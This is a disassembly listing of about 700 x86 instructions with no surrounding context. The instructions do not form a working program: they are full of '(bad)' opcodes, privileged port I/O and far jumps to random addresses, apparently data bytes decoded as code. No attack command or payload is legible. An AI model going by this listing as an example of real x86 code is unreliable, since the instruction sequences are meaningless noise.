  438ab6:	add    ch,BYTE PTR [eax*8+0x6dd41346]
  438abd:	pop    eax
  438abe:	sub    DWORD PTR [edx],edi
  438ac0:	js     0x438ab1
  438ac2:	into   
  438ac3:	jb     0x438a4e
  438ac5:	cmp    al,cl
  438ac7:	(bad)  
  438ac8:	es inc edx
  438aca:	adc    al,0xbf
  438acc:	mov    ebx,0x70036db5
  438ad1:	push   edx
  438ad2:	sub    edi,DWORD PTR [ebx+esi*8]
  438ad5:	ins    BYTE PTR es:[edi],dx
  438ad6:	adc    DWORD PTR [ecx],esp
  438ad8:	mov    ebp,cs
  438ada:	jne    0x438b2c
  438adc:	sbb    eax,0x1aad7882
  438ae1:	and    ecx,DWORD PTR [eax]
  438ae3:	mov    bl,BYTE PTR [ebx+0x13]
  438ae6:	sar    DWORD PTR [esi],1
  438ae8:	mov    esi,0xe2bfd422
  438aed:	dec    ebp
  438aee:	mov    dh,0x5a
  438af0:	push   0xffffff8a
  438af2:	ins    BYTE PTR es:[edi],dx
  438af3:	ss fcmovb st,st(6)
  438af6:	mov    edi,0x6889a9e4
  438afb:	imul   ecx,DWORD PTR [ebx+0x62],0xffffffb2
  438aff:	xor    DWORD PTR [ebx+0x4d],edi
  438b02:	cs ins DWORD PTR es:[edi],dx
  438b04:	sbb    eax,0x3626fa70
  438b09:	jb     0x438b34
  438b0b:	rcr    BYTE PTR [edi+0x34],1
  438b0e:	mov    DWORD PTR [edx+0x3],esp
  438b11:	push   0x28
  438b13:	xor    BYTE PTR [ecx+eiz*2],ah
  438b16:	call   0x8b80:0x809adb76
  438b1d:	imul   ebx,DWORD PTR [esi+0x5f8e86a7],0x10
  438b24:	mov    al,0xdd
  438b26:	fiadd  DWORD PTR [ebx+ecx*8+0x38316eef]
  438b2d:	xchg   ebp,eax
  438b2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  438b2f:	mov    fs,WORD PTR [eax-0x4acb188a]
  438b35:	xor    DWORD PTR [edx],ebp
  438b37:	je     0x438b46
  438b39:	push   ecx
  438b3a:	cmp    ebp,DWORD PTR [eax+0x59b0aac9]
  438b40:	ficom  WORD PTR [ebp+ebp*2-0x25b491f6]
  438b47:	pushf  
  438b48:	and    edx,DWORD PTR [esi]
  438b4a:	jecxz  0x438b8b
  438b4c:	pop    esp
  438b4d:	repnz sbb dl,0x3e
  438b51:	mov    ch,0xc5
  438b53:	rol    BYTE PTR [edx+0x22],0x7d
  438b57:	lods   eax,DWORD PTR ds:[esi]
  438b58:	shl    BYTE PTR [ecx+0x57],cl
  438b5b:	push   ebp
  438b5c:	ins    BYTE PTR es:[edi],dx
  438b5d:	int    0xf4
  438b5f:	push   cs
  438b60:	adc    eax,0xb87cda6c
  438b65:	cmp    DWORD PTR [edx+0x41],ebp
  438b68:	xor    al,0x76
  438b6a:	mov    WORD PTR [edx-0x124d2fac],ds
  438b70:	or     dh,BYTE PTR [ebx]
  438b72:	push   ds
  438b73:	loopne 0x438b86
  438b75:	popf   
  438b76:	mov    ecx,0x44d6ed8a
  438b7b:	mov    es,WORD PTR [edi]
  438b7d:	je     0x438bb2
  438b7f:	cmp    eax,0x3eda39bc
  438b84:	mov    ch,0x1
  438b86:	lahf   
  438b87:	inc    edx
  438b88:	sbb    al,0x6c
  438b8a:	push   0xffffffd1
  438b8c:	push   cs
  438b8d:	cmp    ecx,DWORD PTR [ebp+0x11]
  438b90:	fwait
  438b91:	stos   BYTE PTR es:[edi],al
  438b92:	inc    ebp
  438b93:	(bad)  
  438b94:	lds    ebp,FWORD PTR ds:0x1b015b2
  438b9a:	ins    BYTE PTR es:[edi],dx
  438b9b:	mov    eax,ds:0x11cd028a
  438ba0:	push   es
  438ba1:	mov    BYTE PTR [ebp-0x3a],bl
  438ba4:	dec    esp
  438ba5:	and    cl,cl
  438ba7:	mov    eax,0x920bb5b0
  438bac:	cld    
  438bad:	cwde   
  438bae:	sbb    eax,0xdc10a95f
  438bb3:	pop    esi
  438bb4:	inc    ebx
  438bb5:	adc    DWORD PTR [edi-0x49e3bf5a],esi
  438bbb:	retf   
  438bbc:	pop    ecx
  438bbd:	test   eax,0x5b6d45ad
  438bc2:	int    0xe0
  438bc4:	sbb    esi,DWORD PTR [esi-0x7525d5ad]
  438bca:	push   0x62deb6a1
  438bcf:	es aaa 
  438bd1:	dec    esi
  438bd2:	pop    ss
  438bd3:	inc    eax
  438bd4:	ins    BYTE PTR es:[edi],dx
  438bd5:	mov    ebx,0x352a1d5d
  438bda:	test   BYTE PTR es:[esi],ch
  438bdd:	sbb    BYTE PTR [ebx],0x6d
  438be0:	mov    ds:0x4b274aa5,al
  438be5:	jl     0x438b82
  438be7:	mov    ds:0xcc55176,al
  438bec:	inc    ebp
  438bed:	mov    gs,WORD PTR [eax]
  438bef:	cli    
  438bf0:	pop    ebx
  438bf1:	or     ebp,DWORD PTR [eax]
  438bf3:	ins    DWORD PTR es:[edi],dx
  438bf4:	mov    ds:0xf0bc9944,eax
  438bf9:	pop    edi
  438bfa:	pop    es
  438bfb:	adc    bl,bl
  438bfd:	xchg   BYTE PTR [edx+0x69843e95],ah
  438c03:	das    
  438c04:	push   esi
  438c05:	inc    eax
  438c06:	sbb    ebx,DWORD PTR [ebx+0x13]
  438c09:	aam    0x68
  438c0b:	clc    
  438c0c:	pop    edx
  438c0d:	add    ecx,edx
  438c0f:	mov    ds:0xaf1a1768,eax
  438c14:	call   0x2f4b94c1
  438c19:	in     eax,dx
  438c1a:	sub    al,0x52
  438c1d:	inc    ecx
  438c1e:	bound  ebx,QWORD PTR [esi+eiz*2-0x6a]
  438c22:	imul   BYTE PTR [ebp+0x5b]
  438c25:	cmp    al,BYTE PTR [ecx-0x62]
  438c28:	add    eax,0xcb0474ee
  438c2d:	add    BYTE PTR [ebp-0x40f349a8],0xf0
  438c34:	call   0x52315d39
  438c39:	adc    eax,0xcc4169b
  438c3e:	mov    edi,0x155d8838
  438c43:	fcmovnb st,st(3)
  438c45:	xchg   edx,eax
  438c46:	adc    al,0x5a
  438c48:	dec    eax
  438c49:	push   esi
  438c4a:	sub    BYTE PTR [edx-0x2af59490],dh
  438c50:	jo     0x438ca5
  438c52:	pop    edx
  438c53:	sub    BYTE PTR [ebp+0x42dba26],al
  438c59:	test   DWORD PTR [ecx],ebx
  438c5b:	pop    ds
  438c5c:	ret    0xf086
  438c5f:	dec    esi
  438c60:	mov    ah,BYTE PTR ds:0x5ec7226a
  438c66:	(bad)  
  438c67:	cmp    BYTE PTR [edi+0x1],dl
  438c6a:	mov    bh,0x2e
  438c6c:	dec    ecx
  438c6d:	cmp    al,BYTE PTR [eax+0x661f33]
  438c73:	fstp   QWORD PTR [edx]
  438c75:	pusha  
  438c76:	cmc    
  438c77:	jns    0x438c9e
  438c79:	adc    ch,cl
  438c7b:	and    esp,DWORD PTR [edi+0xd1b6e88]
  438c81:	mov    ecx,0xbf9a1814
  438c86:	jg     0x438cbc
  438c88:	sub    BYTE PTR [esi-0x4b],bh
  438c8b:	add    DWORD PTR [eax-0x2ce8f2b8],ebp
  438c91:	lds    esi,FWORD PTR [ecx+0x61]
  438c94:	popa   
  438c95:	imul   esp,DWORD PTR [esi+0xa],0xffffffc5
  438c99:	pop    edi
  438c9a:	mov    ?,WORD PTR [eax+0x76]
  438c9d:	sbb    ch,al
  438c9f:	jmp    0x438c77
  438ca1:	outs   dx,BYTE PTR ds:[esi]
  438ca2:	dec    ebp
  438ca3:	jg     0x438d19
  438ca5:	inc    ecx
  438ca6:	dec    esi
  438ca7:	retf   0x8fe6
  438caa:	push   ss
  438cab:	es std 
  438cad:	and    ch,BYTE PTR [esi+0x4d]
  438cb0:	hlt    
  438cb1:	xor    cl,BYTE PTR [edx]
  438cb3:	push   ecx
  438cb4:	mov    al,ds:0xc1b0c283
  438cb9:	test   DWORD PTR [ebp-0x40236375],ebp
  438cbf:	hlt    
  438cc0:	mov    BYTE PTR [esi+0x36d8a850],cl
  438cc6:	adc    al,0x7d
  438cc8:	lahf   
  438cc9:	jae    0x438cf7
  438ccb:	inc    eax
  438ccc:	les    eax,FWORD PTR [ebx]
  438cce:	inc    eax
  438ccf:	in     eax,dx
  438cd0:	or     DWORD PTR [eax-0x125ab9e5],0xffffffaa
  438cd7:	ss inc ecx
  438cd9:	neg    BYTE PTR [edx+ecx*1+0x594d63aa]
  438ce0:	xchg   esi,eax
  438ce1:	test   DWORD PTR [esi+0x7f8faa5f],esi
  438ce7:	dec    edx
  438ce8:	jp     0x438d58
  438cea:	(bad)  
  438ceb:	fist   DWORD PTR [esp+ebx*1-0x7c]
  438cef:	inc    edx
  438cf0:	adc    BYTE PTR [edx-0x2fcde292],0x10
  438cf7:	rol    DWORD PTR [esi-0x749b357f],0xc8
  438cfe:	push   esi
  438cff:	add    BYTE PTR [ebp+0x26281456],0x7c
  438d06:	retf   
  438d07:	dec    ebp
  438d08:	shl    ebp,0xdb
  438d0b:	fwait
  438d0c:	lods   eax,DWORD PTR ds:[esi]
  438d0d:	push   ds
  438d0e:	push   ds
  438d0f:	add    BYTE PTR [ecx],dh
  438d11:	pop    esi
  438d12:	mov    ecx,ecx
  438d14:	pop    ss
  438d15:	fisubr DWORD PTR [esi+0x66866e20]
  438d1b:	fdiv   st,st(6)
  438d1d:	fs xor eax,0xdc6d00a1
  438d23:	ficomp DWORD PTR ds:0x4825313b
  438d29:	aas    
  438d2a:	cmc    
  438d2b:	fcomp  QWORD PTR [edx+0x45]
  438d2e:	add    esp,ebx
  438d30:	jo     0x438d6e
  438d32:	add    ch,BYTE PTR [esi+0x38]
  438d35:	push   es
  438d36:	mov    al,ds:0xc31d4576
  438d3b:	dec    edx
  438d3c:	add    BYTE PTR [edx+0x13],ah
  438d3f:	inc    esp
  438d40:	fistp  DWORD PTR [esi]
  438d42:	ins    BYTE PTR es:[edi],dx
  438d43:	jmp    0xcc4dbfb1
  438d48:	inc    ecx
  438d49:	mov    cl,0x6d
  438d4b:	stos   BYTE PTR es:[edi],al
  438d4c:	mov    esp,DWORD PTR [ecx+eiz*2+0x14]
  438d50:	(bad)  
  438d51:	mov    bh,0xad
  438d53:	adc    ebp,edx
  438d55:	xchg   DWORD PTR [edi+ecx*4+0x4d],ebx
  438d59:	inc    esp
  438d5a:	out    dx,eax
  438d5b:	push   esp
  438d5c:	or     DWORD PTR [edx+0x1b],0x59b81532
  438d63:	sbb    al,0xad
  438d65:	push   cs
  438d66:	stos   BYTE PTR es:[edi],al
  438d67:	or     eax,0x7aecdb75
  438d6c:	sbb    eax,0xee250897
  438d71:	cmp    DWORD PTR [ecx-0xae5e923],esi
  438d77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  438d78:	jo     0x438cfd
  438d7a:	mov    al,0x8f
  438d7c:	inc    esi
  438d7d:	mov    edi,0xb70b6c3f
  438d82:	lods   eax,DWORD PTR ds:[esi]
  438d83:	int3   
  438d84:	xlat   BYTE PTR ds:[ebx]
  438d85:	retf   
  438d86:	jecxz  0x438d6f
  438d88:	dec    esp
  438d89:	jbe    0x438dd0
  438d8b:	xlat   BYTE PTR ds:[ebx]
  438d8c:	scas   eax,DWORD PTR es:[edi]
  438d8d:	rcl    BYTE PTR [edx+0x13],1
  438d90:	inc    esp
  438d91:	daa    
  438d92:	jo     0x438dd8
  438d94:	jmp    0xaa89:0xad8dcb2
  438d9b:	lds    edi,FWORD PTR [edi]
  438d9d:	add    al,0x9a
  438d9f:	out    dx,al
  438da0:	aam    0x1
  438da2:	push   ecx
  438da3:	retf   
  438da4:	out    0xc6,al
  438da6:	cmp    ebp,DWORD PTR [ebx+0x54]
  438da9:	ins    DWORD PTR es:[edi],dx
  438daa:	mov    bh,0x2
  438dac:	mov    al,0xb
  438dae:	inc    esi
  438daf:	xchg   BYTE PTR [ebp+0x1],bh
  438db2:	fisttp QWORD PTR [edx-0x2c]
  438db5:	or     dh,BYTE PTR ss:[esi+esi*4]
  438db9:	push   cs
  438dba:	and    DWORD PTR [edi+0x176ae13],esp
  438dc0:	shl    BYTE PTR [esi+0x6daacf4d],0x16
  438dc7:	into   
  438dc8:	mov    edi,0xabaa09
  438dcd:	fist   WORD PTR [ebx-0x4493aec2]
  438dd3:	(bad)  
  438dd4:	hlt    
  438dd5:	dec    DWORD PTR [esi-0x13a3a67c]
  438ddb:	mov    ds:0x586bd0ba,al
  438de0:	pop    es
  438de1:	push   0x3e
  438de3:	ret    0x4075
  438de6:	fist   DWORD PTR [esi+0x4a4541c0]
  438dec:	pop    esi
  438ded:	push   eax
  438dee:	outs   dx,DWORD PTR ds:[esi]
  438def:	xlat   BYTE PTR ds:[ebx]
  438df0:	and    BYTE PTR [edx-0x4a],bl
  438df3:	ins    DWORD PTR es:[edi],dx
  438df4:	inc    ebx
  438df5:	sub    DWORD PTR [esi+0x62ea8cbf],eax
  438dfb:	inc    edi
  438dfc:	adc    BYTE PTR [edi-0x6aad0836],bh
  438e02:	test   al,0x19
  438e04:	pop    ebx
  438e05:	or     BYTE PTR [edx+0x50ca97aa],bl
  438e0b:	push   esp
  438e0c:	ja     0x438de7
  438e0e:	push   0x137a5bbf
  438e13:	(bad)  
  438e14:	and    BYTE PTR [esi+0x3dccbfba],al
  438e1a:	mov    al,0x6d
  438e1c:	mov    fs,WORD PTR [ebp-0x25]
  438e1f:	jae    0x438e2e
  438e21:	out    0x2b,al
  438e23:	jge    0x438e1d
  438e25:	aas    
  438e26:	cs sub al,0xb0
  438e29:	popa   
  438e2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  438e2b:	adc    DWORD PTR [ebp+0xd],0xf14ec8b8
  438e32:	sbb    BYTE PTR [ebx-0x45],bl
  438e35:	aad    0x53
  438e37:	imul   cl
  438e39:	xchg   ebp,eax
  438e3a:	stc    
  438e3b:	jb     0x438e08
  438e3d:	je     0x438e93
  438e3f:	sub    BYTE PTR [esi+0x1b],ch
  438e42:	lea    ecx,[ecx+0x3c]
  438e45:	repz mov dh,0xcb
  438e48:	jecxz  0x438e7b
  438e4a:	dec    ebp
  438e4b:	lds    ebp,FWORD PTR [ebp+0x10d8710e]
  438e51:	mov    ah,0xd9
  438e53:	jl     0x438ed3
  438e55:	pop    ebp
  438e56:	pop    eax
  438e57:	push   0x3e19ac45
  438e5c:	jo     0x438e83
  438e5e:	pop    es
  438e5f:	ins    DWORD PTR es:[edi],dx
  438e60:	xor    eax,0xef832c15
  438e65:	add    eax,0x26305834
  438e6a:	loopne 0x438e2e
  438e6c:	mov    dh,0x11
  438e6e:	add    dl,BYTE PTR [edx-0x3150c51e]
  438e74:	test   DWORD PTR [ebp+0x36c015d4],esi
  438e7a:	retf   
  438e7b:	cmp    DWORD PTR [ebx-0x3b],0x6
  438e7f:	or     eax,0xcb54b441
  438e84:	xchg   ebx,eax
  438e85:	xchg   ebp,eax
  438e86:	das    
  438e87:	inc    esp
  438e88:	mov    bh,0xed
  438e8a:	mov    eax,DWORD PTR [eax+0xd0218d5]
  438e90:	jge    0x438e98
  438e92:	mov    dl,0x2d
  438e94:	mov    cl,0x95
  438e96:	jbe    0x438ee3
  438e98:	es aam 0x89
  438e9b:	jecxz  0x438f0d
  438e9d:	fsub   QWORD PTR [ecx]
  438e9f:	mov    eax,0x922e5855
  438ea4:	xor    al,0x9d
  438ea6:	adc    eax,DWORD PTR [edi]
  438ea8:	cmp    eax,0x82a505c7
  438ead:	push   cs
  438eae:	sub    bh,ch
  438eb0:	pop    ebx
  438eb1:	inc    edi
  438eb2:	fist   DWORD PTR [ecx-0x40]
  438eb5:	scas   eax,DWORD PTR es:[edi]
  438eb6:	jmp    0xe3c0fa10
  438ebb:	les    esi,FWORD PTR [ebx-0x4a]
  438ebe:	adc    BYTE PTR [eax+eiz*1+0x68],ch
  438ec2:	jo     0x438ed9
  438ec4:	call   eax
  438ec6:	ins    BYTE PTR es:[edi],dx
  438ec7:	mov    al,ds:0x56f34da2
  438ecc:	inc    ecx
  438ecd:	and    edx,eax
  438ecf:	imul   eax,DWORD PTR [eax],0x60
  438ed2:	inc    edi
  438ed3:	adc    DWORD PTR [edx+0x52c404af],eax
  438ed9:	and    edi,DWORD PTR [edx-0x7fdccc90]
  438edf:	test   eax,0xb6c6fcb0
  438ee4:	xchg   edi,eax
  438ee5:	xchg   ebp,eax
  438ee6:	or     esp,DWORD PTR [ebx]
  438ee8:	push   edi
  438ee9:	cwde   
  438eea:	dec    eax
  438eeb:	add    BYTE PTR [esi+0x44b0b7c1],ah
  438ef1:	je     0x438f07
  438ef3:	je     0x438eac
  438ef5:	ret    0x230a
  438ef8:	call   0x47fe0d3
  438efd:	inc    edi
  438efe:	ret    
  438eff:	mov    ah,0xf
  438f01:	mov    ds:0xbeb01362,al
  438f06:	(bad)  
  438f07:	cmp    dl,BYTE PTR [ebp-0x5b]
  438f0a:	in     eax,0xb7
  438f0c:	lods   eax,DWORD PTR ds:[esi]
  438f0d:	in     eax,dx
  438f0e:	mov    esi,0x5c80171b
  438f14:	mov    dh,0x55
  438f16:	pusha  
  438f17:	add    BYTE PTR [esi-0x1],al
  438f1a:	mov    cl,0x81
  438f1c:	add    BYTE PTR [ebp-0x1b1d1189],0x23
  438f23:	(bad)  
  438f24:	push   eax
  438f25:	xor    BYTE PTR [esi+0x2ebf90ad],0xcb
  438f2c:	addr16 aad 0x6d
  438f2f:	or     eax,0xec700aa
  438f34:	inc    esp
  438f35:	pop    edi
  438f36:	adc    DWORD PTR [ebx+0x60cd6eaa],edi
  438f3c:	ins    DWORD PTR es:[edi],dx
  438f3d:	(bad)  
  438f3e:	retf   0xda9e
  438f41:	outs   dx,BYTE PTR ds:[esi]
  438f42:	ins    DWORD PTR es:[edi],dx
  438f43:	push   edi
  438f44:	jl     0x438fbc
  438f46:	nop
  438f47:	sub    DWORD PTR [edi-0x6d],esi
  438f4a:	adc    al,0x38
  438f4c:	mov    dl,BYTE PTR [ecx]
  438f4e:	fild   DWORD PTR [esi]
  438f50:	stos   BYTE PTR es:[edi],al
  438f51:	xchg   edx,eax
  438f52:	cmp    al,0x98
  438f54:	jno    0x438fcd
  438f56:	add    DWORD PTR [ebx],ebx
  438f58:	push   0x17
  438f5a:	out    0x50,al
  438f5c:	pop    ebp
  438f5d:	push   0x12
  438f5f:	clc    
  438f60:	mov    dh,0xb1
  438f62:	rol    DWORD PTR [eax],1
  438f64:	cdq    
  438f65:	sahf   
  438f66:	mov    cl,0xac
  438f68:	xchg   esi,eax
  438f69:	xchg   ecx,eax
  438f6a:	out    0x6d,al
  438f6c:	mov    al,ds:0xce58db88
  438f71:	scas   al,BYTE PTR es:[edi]
  438f72:	ins    BYTE PTR es:[edi],dx
  438f73:	xchg   esi,eax
  438f74:	call   0xf76d:0x476d6c15
  438f7b:	push   ecx
  438f7c:	dec    eax
  438f7d:	int3   
  438f7e:	outs   dx,BYTE PTR ds:[esi]
  438f7f:	mov    bl,0xf8
  438f81:	xchg   edx,eax
  438f82:	mov    dh,0x1
  438f84:	add    BYTE PTR [esi+0x2d],ch
  438f87:	or     ebp,DWORD PTR [eax-0x6c]
  438f8a:	jb     0x438fc0
  438f8c:	(bad)
  438f91:	and    esi,DWORD PTR cs:[ebp+0x44ec911f]
  438f98:	and    al,0xd6
  438f9a:	sbb    BYTE PTR [edx+0x567e6fa2],0x35
  438fa1:	ss (bad) 
  438fa3:	leave  
  438fa4:	les    esi,FWORD PTR [edi+0x38525052]
  438faa:	ret    0xb101
  438fad:	or     DWORD PTR [edx],0xffffffb8
  438fb0:	call   0xbf36:0x6dad37
  438fb7:	sbb    dh,BYTE PTR [edi+ebp*2]
  438fba:	inc    edi
  438fbb:	xor    DWORD PTR [esi],edi
  438fbd:	xchg   ebp,eax
  438fbe:	test   al,0x36
  438fc0:	inc    eax
  438fc1:	aam    0x78
  438fc3:	stc    
  438fc4:	dec    eax
  438fc5:	data16 in al,dx
  438fc7:	add    dl,bl
  438fc9:	mov    BYTE PTR [esi-0x73b8fba5],ch
  438fcf:	mov    ch,0x75
  438fd1:	inc    esp
  438fd2:	ins    BYTE PTR es:[edi],dx
  438fd3:	jp     0x438fe8
  438fd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  438fd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  438fd7:	(bad)  
  438fd8:	das    
  438fd9:	into   
  438fda:	scas   al,BYTE PTR es:[edi]
  438fdb:	jmp    0x4195:0x53c7bb42
  438fe2:	repz jecxz 0x438fdf
  438fe5:	mov    esp,0xb6ddb515
  438fea:	and    DWORD PTR [ecx+0xc],ebx
  438fed:	pop    edi
  438fee:	push   esi
  438fef:	dec    edx
  438ff0:	mov    WORD PTR [eax],fs
  438ff2:	jo     0x43905f
  438ff4:	aam    0xd6
  438ff6:	fisub  WORD PTR [edx]
  438ff8:	mov    eax,ds:0x23c80c27
  438ffd:	mov    edi,0x5d8a2a6c
  439002:	inc    esi
  439003:	mov    ds:0x60f1d7f6,al
  439008:	sub    DWORD PTR [edx+0x10],0xf48e613c
  43900f:	ror    BYTE PTR [ebx+0x4e68aa68],cl
  439015:	xlat   BYTE PTR ds:[ebx]
  439016:	js     0x438fb8
  439018:	(bad)  
  439019:	inc    esp
  43901a:	ins    DWORD PTR es:[edi],dx
  43901b:	inc    eax
  43901c:	sbb    ebp,DWORD PTR [edi+0x37]
  43901f:	pop    ss
  439020:	add    eax,0xedaa80ea
  439025:	retf   0x8329
  439028:	xchg   ecx,eax
  439029:	daa    
  43902a:	xchg   esi,eax
  43902b:	fwait
  43902c:	pusha  
  43902d:	pop    ebx
  43902e:	mov    BYTE PTR [ebx-0x1cd591cd],dl
  439034:	mov    dh,0xf
  439036:	dec    ebp
  439037:	dec    ebp
  439038:	mov    ah,0x6d
  43903a:	enter  0xf83e,0x6
  43903e:	lahf   
  43903f:	retf   
  439040:	or     bl,al
  439042:	pop    ebp
  439043:	or     BYTE PTR [ebp+edx*2+0xe],0x38
  439048:	xchg   ebp,eax
  439049:	aad    0x36
  43904b:	pop    ss
  43904c:	or     eax,0x6cb21001
  439051:	inc    ecx
  439052:	xor    esi,edx
  439054:	inc    ebp
  439055:	aam    0x8d
  439057:	div    DWORD PTR [ecx-0x58]
  43905a:	loop   0x43905f
  43905c:	(bad)
  439060:	rol    BYTE PTR [ebx+0x7de6f5c],cl
  439066:	stos   DWORD PTR es:[edi],eax
  439067:	adc    eax,0x2eeb6db7
  43906c:	xlat   BYTE PTR ds:[ebx]
  43906d:	stos   BYTE PTR es:[edi],al
  43906e:	mov    dh,0xce
  439070:	das    
  439071:	sbb    bh,BYTE PTR [edi-0x5de4eb10]
  439077:	or     eax,0xf1ec1148
  43907c:	ins    DWORD PTR es:[edi],dx
  43907d:	mov    ch,0xc6
  43907f:	lods   eax,DWORD PTR ds:[esi]
  439080:	test   eax,0x4a6ebd36
  439085:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  439087:	cmp    ebx,DWORD PTR ds:0x821b3311
  43908d:	call   0x81447f84
  439092:	into   
  439093:	arpl   WORD PTR [edx+0x53],sp
  439096:	xchg   edx,eax
  439097:	and    BYTE PTR [esi+0xd],ch
  43909a:	adc    eax,0x36440654
  43909f:	and    BYTE PTR [ebx],cl
  4390a1:	mov    cl,BYTE PTR [edi+0x6d]
  4390a4:	mov    dl,0xfa
  4390a6:	lea    ebx,[edx+0x1b]
  4390a9:	icebp  
  4390aa:	mov    ah,0x4b
  4390ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4390ad:	lea    ebp,[ebp-0x512d37e7]
  4390b3:	jmp    0x553f59aa
  4390b8:	rol    BYTE PTR [esi],0x80
  4390bb:	test   BYTE PTR [edx-0x30],dl
  4390be:	hlt    
  4390bf:	sbb    bl,0x42
  4390c2:	fistp  DWORD PTR [edx-0xb791b2b]
  4390c8:	fcom   DWORD PTR [edx+edi*2]
  4390cb:	dec    eax
  4390cc:	ss inc esp
  4390ce:	mov    ah,0x21
  4390d0:	mov    DWORD PTR [edx+0x71],0x74213cea
  4390d7:	mov    ds:0xea53a0a9,eax
  4390dc:	lahf   
  4390dd:	xchg   edi,eax
  4390de:	(bad)  [ebp+0x75450d14]
  4390e4:	dec    esi
  4390e5:	les    ecx,FWORD PTR [ebx]
  4390e7:	ret    0x95b6
  4390ea:	mov    dl,dh
  4390ec:	mov    dh,0x20
  4390ee:	mov    esp,0xba324bf
  4390f3:	or     eax,DWORD PTR [edi+ebp*8+0x5c]
  4390f7:	dec    edx
  4390f8:	sub    al,0xc0
  4390fa:	scas   al,BYTE PTR es:[edi]
  4390fb:	and    bh,BYTE PTR [ebx-0x77712fb0]
  439101:	sti    
  439102:	int    0xce
  439104:	xor    DWORD PTR [ebp-0x16c97f7a],eax
  43910a:	jbe    0x439098
  43910c:	call   0xd507:0x629a9787
  439113:	cmp    BYTE PTR [ebx-0x74e9ec9f],ah
  439119:	out    0x82,eax
  43911b:	sbb    eax,0x919bdd45
  439120:	adc    ah,0x32
  439123:	out    0x35,al
  439125:	adc    al,0xb0
  439127:	and    DWORD PTR [edx],ecx
  439129:	mov    bh,0x87
  43912b:	cdq    
  43912c:	mov    ecx,edx
  43912e:	stos   BYTE PTR es:[edi],al
  43912f:	lods   eax,DWORD PTR ds:[esi]
  439130:	push   eax
  439131:	xchg   ebp,eax
  439132:	ret    0x344c
  439135:	aaa    
  439136:	fimul  DWORD PTR [esi-0x53c04b46]
  43913c:	stos   DWORD PTR es:[edi],eax
  43913d:	sbb    BYTE PTR [edx+0x78ad0962],bh
  439143:	pop    ss
  439144:	push   ss
  439145:	rol    BYTE PTR [ecx+0x6a],0xd0
  439149:	out    0x97,eax
  43914b:	xor    edi,ebx
  43914d:	adc    DWORD PTR [esp+edx*1],esi
  439150:	ins    DWORD PTR es:[edi],dx
  439151:	jp     0x43919b
  439153:	jge    0x439107
  439155:	mov    dh,0x76
  439157:	adc    al,0x6c
  439159:	adc    al,0x76
  43915b:	iret   
  43915c:	pop    edi
  43915d:	addr16 mov al,ds:0xda9
  439161:	add    al,0xb5
  439163:	mov    DWORD PTR [esi-0x42],edi
  439166:	push   0x21a7db6
  43916b:	mov    edx,0x9820116d
  439170:	mov    dl,0x47
  439172:	jae    0x4391c0
  439174:	mov    ch,BYTE PTR ds:0xff16b68a
  43917a:	inc    esp
  43917b:	retf   0xd6d2
  43917e:	inc    eax
  43917f:	in     al,dx
  439180:	setns  ah
  439183:	inc    esi
  439184:	(bad)  
  439186:	lahf   
  439187:	enter  0x6b7,0x40
  43918b:	fstp   TBYTE PTR [esi+0xe]
  43918e:	mov    ah,0xd3
  439190:	jno    0x439158
  439192:	push   ds
  439193:	mov    ch,BYTE PTR [eax+0x13]
  439196:	push   esp
  439197:	mov    dh,dl
  439199:	mov    eax,ds:0x3a2296a8
  43919e:	out    dx,eax
  43919f:	test   al,0xab
  4391a1:	jb     0x439159
  4391a3:	test   DWORD PTR [edx+0x4289518e],ecx
  4391a9:	mov    dh,0x50
  4391ab:	sbb    dh,BYTE PTR [eax+0x70156ed4]
  4391b1:	cli    
  4391b2:	arpl   dx,di
  4391b4:	mov    ecx,0xa8092689
  4391b9:	cs sub al,0x6c
  4391bc:	sub    bh,BYTE PTR [edi+0x1d]
  4391bf:	mov    ebp,DWORD PTR [edi-0x56]
  4391c2:	sub    eax,0x734aa168
  4391c7:	mov    ds:0xc444180e,al
  4391cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4391cd:	scas   al,BYTE PTR es:[edi]
  4391ce:	scas   eax,DWORD PTR es:[edi]
  4391cf:	ins    BYTE PTR es:[edi],dx
  4391d0:	ds fs pop edx
  4391d3:	in     eax,dx
  4391d4:	mov    dh,0x6c
  4391d6:	je     0x439192
  4391d8:	sbb    al,0xe7
  4391da:	and    edi,DWORD PTR [esi+ebp*2+0x40532f43]
  4391e1:	push   esp
  4391e2:	dec    ebx
  4391e3:	add    eax,0x2e82c23
  4391e8:	jmp    0x9429:0x5ac5ad6
  4391ef:	mov    ds:0x3edc00be,al
  4391f4:	or     dh,dl
  4391f6:	dec    esi
  4391f7:	jmp    0x55b9e4f5
  4391fc:	dec    ebx
  4391fd:	aad    0x3c
  4391ff:	sub    ebp,ecx
  439201:	cs add eax,0x976c4a64
  439207:	ds fcmove st,st(0)
  43920a:	mov    al,0x40
  43920c:	daa    
  43920d:	jmp    0x2e359548
  439212:	pop    esi
  439213:	fiadd  DWORD PTR [edx-0xce3cbd6]
  439219:	dec    ebp
  43921a:	add    al,0x0
  43921c:	lods   eax,DWORD PTR ds:[esi]
  43921d:	imul   esp,DWORD PTR [edx-0x58ada2d3],0xffffff92
  439224:	push   0x1a
  439226:	call   0x3b982dc5
  43922b:	and    ch,BYTE PTR [eax-0x72]
  43922e:	sti    
  43922f:	inc    ecx
  439230:	jmp    0x75fa6dd7
  439235:	out    dx,al
  439236:	pop    ebp
  439237:	mov    eax,ds:0x418fc53c
  43923c:	sub    BYTE PTR [eax+0x75],bh
  43923f:	add    edx,0x2575680e
  439245:	jl     0x43929e
  439247:	mov    ecx,0x76001af9
  43924c:	add    ecx,edi
  43924e:	(bad)  
  43924f:	in     al,dx
  439250:	inc    ebx
  439251:	pop    edx
  439252:	ss inc esp
  439254:	pop    esp
  439255:	fiadd  DWORD PTR [esi-0x23489dbe]
  43925b:	retf   
  43925c:	cmp    DWORD PTR [ebp-0x27fd124c],0xffffff8f
  439263:	mov    al,ds:0xfbf6be22
  439268:	jns    0x43921f
  43926a:	mov    al,0xd1
  43926c:	adc    al,0xb6
  43926e:	lahf   
  43926f:	test   al,0xfd
  439271:	shl    BYTE PTR [edx+0xa2dc6c1],1
  439277:	jo     0x43928b
  439279:	cmp    DWORD PTR [edx+edi*4-0x10],ecx
